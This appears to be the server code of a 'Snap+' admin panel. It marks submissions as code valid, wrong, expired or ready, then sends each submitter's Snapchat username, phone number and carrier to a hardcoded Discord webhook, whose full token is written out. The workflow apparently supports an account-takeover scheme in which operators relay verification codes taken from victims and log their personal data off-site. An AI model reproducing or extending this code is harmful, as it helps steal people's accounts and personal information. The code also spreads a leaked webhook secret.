import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1520075027377164368/SRDgc2Ncec6qbVyFYKvD6oaWcNHZJC_HyisJS3hZPF6RALBe4LWOTlEnAxgWHZc3IZPV";

function getClientIP(req) {
  return req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
    || req.headers.get("x-real-ip")
    || "IP inconnue";
}

Deno.serve(async (req) => {
  try {
    const adminIP = getClientIP(req);
    const { submissionId, action } = await req.json();

    if (!submissionId) {
      return Response.json({ error: 'submissionId requis' }, { status: 400 });
    }

    const statusMap = {
      valid: "code_valid",
      wrong: "code_wrong",
      expired: "code_expired",
      wait: "waiting_queue",
      code_ready: "code_ready",
    };

    const newStatus = statusMap[action] || "code_ready";

    const base44 = createClientFromRequest(req);
    const submission = await base44.asServiceRole.entities.Submission.get(submissionId);
    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });

    // Notify Discord with admin IP (no @everyone ping)
    const now = new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris", hour: "2-digit", minute: "2-digit", second: "2-digit", day: "2-digit", month: "short" });
    await fetch(ADMIN_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "📤 Code envoyé par un admin",
          color: 0xFFBF00,
          fields: [
            { name: "👻 Snapchat", value: submission?.snapchat || "—", inline: true },
            { name: "📞 Téléphone", value: submission?.telephone || "—", inline: true },
            { name: "📡 Opérateur", value: submission?.operateur || "—", inline: true },
            { name: "🌐 IP Admin", value: adminIP, inline: true },
            { name: "🕐 Heure", value: now, inline: true },
          ],
          footer: { text: "Admin Dashboard • Snap+" }
        }]
      })
    }).catch(() => {});

    return Response.json({ ok: true });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});